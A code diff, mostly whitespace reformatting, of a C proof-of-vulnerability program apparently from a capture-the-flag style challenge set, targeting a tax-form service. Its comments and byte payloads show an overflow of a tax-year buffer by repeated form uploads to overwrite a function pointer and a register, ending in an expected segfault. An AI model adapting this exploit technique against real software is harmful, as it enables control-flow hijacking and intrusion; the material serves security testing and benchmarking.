@@ -18,64 +18,62 @@
  * CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT,
  * TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
  * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
-*/
+ */
 #include <libpov.h>
 
 int main(void) {
-   type1_vals t1vals = { 0 };
-   uint32_t mask_eip, mask_reg;
+  type1_vals t1vals = {0};
+  uint32_t mask_eip, mask_reg;
 
-   mask_eip = 0x0DFFFEFF;
-   mask_reg = 0xEFFFF7FF;
+  mask_eip = 0x0DFFFEFF;
+  mask_reg = 0xEFFFF7FF;
 
-   type1_negotiate(mask_eip, mask_reg, 2, &t1vals);
+  type1_negotiate(mask_eip, mask_reg, 2, &t1vals);
 
-   t1vals.ipval |= 0xF0000000;   // make sure out of range of valid fn ptrs
-   // t1vals.regval |= 0xF0000000;  // make sure out of range of valid fn ptrs
+  t1vals.ipval |= 0xF0000000;  // make sure out of range of valid fn ptrs
+  // t1vals.regval |= 0xF0000000;  // make sure out of range of valid fn ptrs
 
-   t1vals.ipval |= 0x02000100;   // make sure will result in unique tax_years
-   t1vals.regval |= 0x10000800;  // make sure will result in unique tax_years
+  t1vals.ipval |= 0x02000100;   // make sure will result in unique tax_years
+  t1vals.regval |= 0x10000800;  // make sure will result in unique tax_years
 
+  char *p_ipval = (char *)&t1vals.ipval;
+  char *p_regval = (char *)&t1vals.regval;
 
-   char *p_ipval  = (char *)&t1vals.ipval;
-   char *p_regval = (char *)&t1vals.regval;
+  /**
+  # Fill year_buf with 64 years
+  # after that the next 2 overwrite fn ptr (EIP)
+  # 4 more to fill in space
+  # then last 2 will overwite *r (EDX)
 
+  session buf2 -> cmd[8], bytes[2], data[N]
 
-   /**
-   # Fill year_buf with 64 years
-   # after that the next 2 overwrite fn ptr (EIP)
-   # 4 more to fill in space
-   # then last 2 will overwite *r (EDX)
+  tax_yr is data[0], data[1] -> buf bytes 10 and 11
 
-   session buf2 -> cmd[8], bytes[2], data[N]
+  for 0x0FFF
+  buf[10] = p_ipval[0];
+  buf[11] = p_ipval[1];
 
-   tax_yr is data[0], data[1] -> buf bytes 10 and 11
+  for 0x1FFF
+  buf[10] = p_ipval[2];
+  buf[11] = p_ipval[3];
 
-   for 0x0FFF
-   buf[10] = p_ipval[0];
-   buf[11] = p_ipval[1];
+  for 0xFBBF
+  buf[10] = p_regval[0];
+  buf[11] = p_regval[1];
 
-   for 0x1FFF
-   buf[10] = p_ipval[2];
-   buf[11] = p_ipval[3];
+  for 0xFBB0
+  buf[10] = p_regval[2];
+  buf[11] = p_regval[3];
+  **/
 
-   for 0xFBBF
-   buf[10] = p_regval[0];
-   buf[11] = p_regval[1];
+  unsigned int read_buf_len = 148;
+  unsigned char *read_buf = (unsigned char *)malloc(read_buf_len);
 
-   for 0xFBB0
-   buf[10] = p_regval[2];
-   buf[11] = p_regval[3];
-   **/
+  unsigned int pwd_len = 12;
+  unsigned char *pwd = (unsigned char *)malloc(pwd_len);
 
-   unsigned int  read_buf_len = 148;
-   unsigned char *read_buf = (unsigned char*)malloc(read_buf_len);
-
-   unsigned int pwd_len = 12;
-   unsigned char *pwd = (unsigned char*)malloc(pwd_len);
-
-   // Create Account
-   static unsigned char write_00000[] = 
+  // Create Account
+  static unsigned char write_00000[] =
       "\x58\x42\x42\x77\x48\x46\x63\x5a\x47\x6d\x7a\x78\x62\x71\x43\x7a"
       "\x73\x55\x78\x68\x61\x59\x41\x6e\x00\x00\x00\x00\x00\x00\x00\x00"
       "\x00\x00\x00\x00\xa0\xa1\xa2\xa3\xa0\xa1\xa2\xa3\x88\x02\x6f\x52"
@@ -120,48 +118,46 @@ int main(void) {
       "\x78\x71\x42\x78\x41\x41\x59\x64\x75\x46\x46\x4c\x6e\x44\x63\x4b"
       "\x55\x75\x4b\x4a\x66\x61\x6c\x4c\x64\x56\x77\x55\x44\x67\x2c\x2e"
       "\x2e\x00\x38\x25\x18\x00";
-   static unsigned int write_00000_len = 694;
-   transmit_all(1, write_00000, write_00000_len);
+  static unsigned int write_00000_len = 694;
+  transmit_all(1, write_00000, write_00000_len);
 
-   // read s_key
-   length_read(0, read_buf, 12);
+  // read s_key
+  length_read(0, read_buf, 12);
 
-   // read pwd 
-   length_read(0, pwd, pwd_len);
+  // read pwd
+  length_read(0, pwd, pwd_len);
 
-   // read the rest
-   length_read(0, read_buf, 8+128-12);
+  // read the rest
+  length_read(0, read_buf, 8 + 128 - 12);
 
+  // Login
+  // send buf1
+  static unsigned char write_login_buf1[] =
+      "\x43\x4e\x51\x6c\x48\x67\x44\x41\x52\x51\x59\x51\x62\x71\x43\x7a"
+      "\x73\x55\x78\x68\x61\x59\x41\x6e";
+  static unsigned int write_login_buf1_len = 24;
+  transmit_all(1, write_login_buf1, write_login_buf1_len);
 
-   // Login
-   // send buf1
-   static unsigned char write_login_buf1[] = 
-         "\x43\x4e\x51\x6c\x48\x67\x44\x41\x52\x51\x59\x51\x62\x71\x43\x7a"
-         "\x73\x55\x78\x68\x61\x59\x41\x6e";
-   static unsigned int write_login_buf1_len = 24;
-   transmit_all(1, write_login_buf1, write_login_buf1_len);
+  // send pwd
+  transmit_all(1, pwd, pwd_len);
 
-   // send pwd
-   transmit_all(1, pwd, pwd_len);
+  // send buf2
+  static unsigned char write_login_buf2[] =
+      "\xbc\xbc\xbc\xbc\xbc\xbc\xbc\xbc\x00\x00";
+  static unsigned int write_login_buf2_len = 10;
+  transmit_all(1, write_login_buf2, write_login_buf2_len);
 
-   // send buf2
-   static unsigned char write_login_buf2[] = 
-         "\xbc\xbc\xbc\xbc\xbc\xbc\xbc\xbc\x00\x00";
-   static unsigned int write_login_buf2_len = 10;
-   transmit_all(1, write_login_buf2, write_login_buf2_len);
+  length_read(0, read_buf, read_buf_len);
 
-   length_read(0, read_buf, read_buf_len);
+  // Upload Forms
+  // Start loop of 64 to fill buffer
 
+  static unsigned char write_buf1[] =
+      "\x43\x4e\x51\x6c\x48\x67\x44\x41\x52\x51\x59\x51\x62\x71\x43\x7a"
+      "\x73\x55\x78\x68\x61\x59\x41\x6e";
+  static unsigned int write_buf1_len = 24;
 
-   // Upload Forms
-   // Start loop of 64 to fill buffer
-
-   static unsigned char write_buf1[] = 
-         "\x43\x4e\x51\x6c\x48\x67\x44\x41\x52\x51\x59\x51\x62\x71\x43\x7a"
-         "\x73\x55\x78\x68\x61\x59\x41\x6e";
-   static unsigned int write_buf1_len = 24;
-
-   static unsigned char write_buf2[] = 
+  static unsigned char write_buf2[] =
       "\xf0\xf1\xf2\xf3\xf0\xf1\xf2\xf3\xeb\x02\x15\x84\x6f\x52\x47\x4c"
       "\x5a\x65\x46\x42\x57\x72\x4c\x62\x58\x71\x77\x63\x67\x4b\x68\x58"
       "\x43\x7a\x47\x52\x4c\x68\x4c\x77\x74\x56\x49\x42\x48\x63\x54\x63"
@@ -210,88 +206,87 @@ int main(void) {
       "\x4a\x43\x1a\x15\x0e\x4e\xad\x0b\x00\x45\x24\x00\x00\xd3\x1d\x01"
       "\x00\x4c\x70\x47\x6f\x34\x31\x34\x31\x34\x30\x31\x37\xd0\xb5\x00"
       "\x00\x00\x00\x00\x00";
-   static unsigned int write_buf2_len = 757;
+  static unsigned int write_buf2_len = 757;
 
-   // keep track of tax_yr counter bytes to ensure we don't get duplicate tax years
-   unsigned char tax_yr_byte10 = write_buf2[10];
-   unsigned char tax_yr_byte11 = write_buf2[11];
+  // keep track of tax_yr counter bytes to ensure we don't get duplicate tax
+  // years
+  unsigned char tax_yr_byte10 = write_buf2[10];
+  unsigned char tax_yr_byte11 = write_buf2[11];
 
-   // upload form loop to fill buffer
-   for (int i = 0; i < 64; i++) {
-      transmit_all(1, write_buf1, write_buf1_len);
-      transmit_all(1, pwd, pwd_len);
-      write_buf2[10] = tax_yr_byte10++;
-      // write_buf2[10] = tax_yr_byte;
-      transmit_all(1, write_buf2, write_buf2_len);
-      length_read(0, read_buf, read_buf_len);
-   }
+  // upload form loop to fill buffer
+  for (int i = 0; i < 64; i++) {
+    transmit_all(1, write_buf1, write_buf1_len);
+    transmit_all(1, pwd, pwd_len);
+    write_buf2[10] = tax_yr_byte10++;
+    // write_buf2[10] = tax_yr_byte;
+    transmit_all(1, write_buf2, write_buf2_len);
+    length_read(0, read_buf, read_buf_len);
+  }
 
-   // upload form, tax year 0x0FFF buf1
-   transmit_all(1, write_buf1, write_buf1_len);
-   transmit_all(1, pwd, pwd_len);
-   // for 0x0FFF
-   write_buf2[10] = p_ipval[0];
-   write_buf2[11] = p_ipval[1];
+  // upload form, tax year 0x0FFF buf1
+  transmit_all(1, write_buf1, write_buf1_len);
+  transmit_all(1, pwd, pwd_len);
+  // for 0x0FFF
+  write_buf2[10] = p_ipval[0];
+  write_buf2[11] = p_ipval[1];
 
-   transmit_all(1, write_buf2, write_buf2_len);
-   length_read(0, read_buf, read_buf_len);
+  transmit_all(1, write_buf2, write_buf2_len);
+  length_read(0, read_buf, read_buf_len);
 
-   // upload form, tax year 0x1FFF buf1
-   transmit_all(1, write_buf1, write_buf1_len);
-   transmit_all(1, pwd, pwd_len);
-   // for 0x1FFF
-   write_buf2[10] = p_ipval[2];
-   write_buf2[11] = p_ipval[3];
+  // upload form, tax year 0x1FFF buf1
+  transmit_all(1, write_buf1, write_buf1_len);
+  transmit_all(1, pwd, pwd_len);
+  // for 0x1FFF
+  write_buf2[10] = p_ipval[2];
+  write_buf2[11] = p_ipval[3];
 
-   transmit_all(1, write_buf2, write_buf2_len);
-   length_read(0, read_buf, read_buf_len);
+  transmit_all(1, write_buf2, write_buf2_len);
+  length_read(0, read_buf, read_buf_len);
 
-   // upload form loop for 4 more extras
-   for (int i = 0; i < 4; i++) {
-      transmit_all(1, write_buf1, write_buf1_len);
-      transmit_all(1, pwd, pwd_len);
-      // set tax_yr_byte in write_buf2
-      write_buf2[10] = tax_yr_byte10++;
-      write_buf2[11] = tax_yr_byte11;
-      transmit_all(1, write_buf2, write_buf2_len);
-      length_read(0, read_buf, read_buf_len);
-   }
+  // upload form loop for 4 more extras
+  for (int i = 0; i < 4; i++) {
+    transmit_all(1, write_buf1, write_buf1_len);
+    transmit_all(1, pwd, pwd_len);
+    // set tax_yr_byte in write_buf2
+    write_buf2[10] = tax_yr_byte10++;
+    write_buf2[11] = tax_yr_byte11;
+    transmit_all(1, write_buf2, write_buf2_len);
+    length_read(0, read_buf, read_buf_len);
+  }
 
-   // upload form, tax year 0xFBBF buf1
-   transmit_all(1, write_buf1, write_buf1_len);
-   transmit_all(1, pwd, pwd_len);
-   // for 0xFBBF
-   write_buf2[10] = p_regval[0];
-   write_buf2[11] = p_regval[1];
+  // upload form, tax year 0xFBBF buf1
+  transmit_all(1, write_buf1, write_buf1_len);
+  transmit_all(1, pwd, pwd_len);
+  // for 0xFBBF
+  write_buf2[10] = p_regval[0];
+  write_buf2[11] = p_regval[1];
 
-   transmit_all(1, write_buf2, write_buf2_len);
-   length_read(0, read_buf, read_buf_len);
+  transmit_all(1, write_buf2, write_buf2_len);
+  length_read(0, read_buf, read_buf_len);
 
-   // upload form, tax year 0xFBBO buf1
-   transmit_all(1, write_buf1, write_buf1_len);
-   transmit_all(1, pwd, pwd_len);
-   // for 0xFBB0
-   write_buf2[10] = p_regval[2];
-   write_buf2[11] = p_regval[3];
+  // upload form, tax year 0xFBBO buf1
+  transmit_all(1, write_buf1, write_buf1_len);
+  transmit_all(1, pwd, pwd_len);
+  // for 0xFBB0
+  write_buf2[10] = p_regval[2];
+  write_buf2[11] = p_regval[3];
 
-   transmit_all(1, write_buf2, write_buf2_len);
-   length_read(0, read_buf, read_buf_len);
+  transmit_all(1, write_buf2, write_buf2_len);
+  length_read(0, read_buf, read_buf_len);
 
+  // tax submitted buf1
+  transmit_all(1, write_buf1, write_buf1_len);
+  // tax submitted pwd
+  transmit_all(1, pwd, pwd_len);
 
-   // tax submitted buf1
-   transmit_all(1, write_buf1, write_buf1_len);
-   // tax submitted pwd
-   transmit_all(1, pwd, pwd_len);
+  // tax submitted buf2
+  static unsigned char write_00222[] =
+      "\x50\x11\x50\x11\x50\x11\x50\x11\x04\x00\x00\x00\xff\xff";
+  static unsigned int write_00222_len = 14;
+  transmit_all(1, write_00222, write_00222_len);
 
-    // tax submitted buf2
-   static unsigned char write_00222[] = 
-         "\x50\x11\x50\x11\x50\x11\x50\x11\x04\x00\x00\x00\xff\xff";
-   static unsigned int write_00222_len = 14;
-   transmit_all(1, write_00222, write_00222_len);
+  // should segfault here...
 
-   // should segfault here...
-
-   // tax submitted read
-   length_read(0, read_buf, read_buf_len);
-   
+  // tax submitted read
+  length_read(0, read_buf, read_buf_len);
 }
